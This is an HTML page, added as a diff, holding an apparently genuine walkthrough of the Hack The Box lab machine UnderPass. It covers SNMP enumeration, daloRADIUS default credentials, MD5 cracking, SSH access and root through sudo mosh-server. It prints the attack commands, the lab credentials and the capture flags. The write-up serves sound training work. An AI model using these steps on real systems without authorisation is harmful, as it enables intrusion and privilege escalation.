@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB UnderPass — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🚇</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='underpass'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-up','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-up')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>UnderPass</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 80 · 161/udp</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">SNMP leak → daloRADIUS default creds → MD5 crack</span><span class="chain-arrow">→</span><span class="chain-node blue">SSH svcMosh</span><span class="chain-arrow">→</span><span class="chain-node red">sudo mosh-server → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>TCP Scan</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.231.213</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works</span></code></pre>
+
+<p>Only a default Apache page — no web app, no obvious attack surface. Don't stop here.</p>
+
+<h3>UDP Scan — The Critical SNMP Port</h3>
+<pre><code><span class="cmd">$ sudo nmap -sU --top-ports 100 -T4 10.129.231.213</span>
+<span class="output">PORT    STATE SERVICE
+<span class="highlight">161/udp open  snmp</span></span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">Why scan UDP?</span>
+TCP scans only cover half the picture. SNMP (UDP 161) is one of the most common information leakers — it exposes process lists, software versions, network config, and sometimes even passwords in command-line arguments. The default community string <code>public</code> works on a shocking number of real-world devices.
+</div>
+
+<h3>SNMP Enumeration</h3>
+<pre><code><span class="cmd">$ snmpwalk -v 2c -c public 10.129.231.213 -On > snmp_full.txt 2>/dev/null</span>
+
+<span class="comment"># Search for interesting strings</span>
+<span class="cmd">$ grep -i "dalo\|radius\|underpass\|pass" snmp_full.txt</span></code></pre>
+
+<p>SNMP output reveals <code>daloRADIUS</code> and the hostname <code>underpass.htb</code>.</p>
+
+<pre><code><span class="cmd">$ echo "10.129.231.213 underpass.htb" | sudo tee -a /etc/hosts</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — daloRADIUS Default Credentials → MD5 Crack → SSH</h2></div>
+
+<h3>daloRADIUS Operator Login</h3>
+
+<div class="callout callout-why">
+<span class="callout-label">What is daloRADIUS?</span>
+An open-source web frontend for RADIUS (Remote Authentication Dial-In User Service) — the protocol ISPs and enterprises use for WiFi/VPN authentication and billing. Think of it as "the admin panel for managing who can connect to the network." It has two login portals: one for regular users and one for operators (admins).
+</div>
+
+<pre><code><span class="comment"># Operator (admin) portal:</span>
+<span class="cmd">http://underpass.htb/daloradius/app/operators/login.php</span>
+
+<span class="comment"># Default credentials:</span>
+<span class="highlight">administrator : radius</span></code></pre>
+
+<h3>Extract User Hash</h3>
+<p>In the admin panel under user management, find user <code>svcMosh</code> with an MD5 password hash:</p>
+
+<pre><code><span class="output">Username: <span class="highlight">svcMosh</span>
+Password: <span class="highlight">412DD4759978ACFCC81DEAB01B382403</span></span></code></pre>
+
+<h3>Crack MD5</h3>
+<pre><code><span class="cmd">$ echo '412DD4759978ACFCC81DEAB01B382403' > hash.txt
+$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="output">412dd4759978acfcc81deab01b382403:<span class="highlight">underwaterfriends</span></span></code></pre>
+
+<h3>SSH → User Flag</h3>
+<pre><code><span class="cmd">$ ssh svcMosh@underpass.htb</span>
+<span class="output">Password: underwaterfriends</span>
+
+<span class="cmd">svcMosh@underpass:~$ cat user.txt</span>
+<span class="output">577a7fca979a69f68fd9e4a4c17c5192</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 2</div><h2>Privilege Escalation — sudo mosh-server</h2></div>
+
+<h3>Sudo Enumeration</h3>
+<pre><code><span class="cmd">svcMosh@underpass:~$ sudo -l</span>
+<span class="output">User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: <span class="highlight">/usr/bin/mosh-server</span></span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">What is mosh and why does it give root?</span>
+<strong>mosh (Mobile Shell)</strong> is an SSH alternative designed for mobile/high-latency networks. It works over UDP and handles disconnects gracefully. The key is how it starts: <code>mosh-server</code> launches a new shell session as <strong>whoever runs it</strong>. Normally that's your own user, but with sudo it runs as root — so the session it creates is a root shell. The <code>mosh</code> client's <code>--server</code> parameter specifies the command to run on the remote side, and it's passed directly to the shell — so we inject <code>sudo /usr/bin/mosh-server</code>.
+</div>
+
+<h3>One Command Root Shell</h3>
+<pre><code><span class="cmd">svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost</span>
+
+<span class="output">root@underpass:~# whoami
+root</span>
+
+<span class="cmd">root@underpass:~# cat root.txt</span>
+<span class="output">cd9f7b68ae4deab3586609ddb0b6c9b3</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">GTFOBins-class escalation</span>
+This is the same pattern as <code>sudo vim</code> → <code>:!bash</code>, or <code>sudo find -exec /bin/bash</code>. Any program that can spawn an interactive session, when run as root via sudo, becomes a root shell. <code>mosh-server</code> is a less common but equally effective example. Always cross-reference <code>sudo -l</code> output against GTFOBins.
+</div>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Always scan UDP — SNMP is a goldmine.</strong><p>TCP-only scans miss critical services. SNMP on UDP 161 with default community <code>public</code> leaks process lists, software versions, and sometimes credentials.</p></div>
+<div class="takeaway-item"><strong>Default credentials are still everywhere.</strong><p>daloRADIUS ships with <code>administrator:radius</code>. Always try known defaults before brute-forcing — check SecLists' default-passwords lists and vendor documentation.</p></div>
+<div class="takeaway-item"><strong>RADIUS stores passwords as weak hashes.</strong><p>MD5 without salt is trivially crackable. RADIUS user databases are high-value targets because the hashes are often in rockyou.</p></div>
+<div class="takeaway-item"><strong><code>mosh-server</code> with sudo = instant root.</strong><p>Like vim, find, and less, mosh-server spawns interactive sessions as the running user. With NOPASSWD sudo, <code>mosh --server="sudo mosh-server" localhost</code> gives root in one command.</p></div>
+<div class="takeaway-item"><strong>Audit every sudo entry against GTFOBins.</strong><p>Even obscure binaries like mosh-server can be escalation vectors. If a program can start a process, read files, or write files — and it's in sudo — it's likely exploitable.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">SNMP leak</span><span class="arrow">→</span><span class="node node-green">daloRADIUS default creds</span><span class="arrow">→</span><span class="node node-green">MD5 crack</span><span class="arrow">→</span><span class="node node-blue">SSH svcMosh</span><span class="arrow">→</span><span class="node node-red">sudo mosh-server → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB UnderPass Writeup · 2026</footer>
+</body></html>
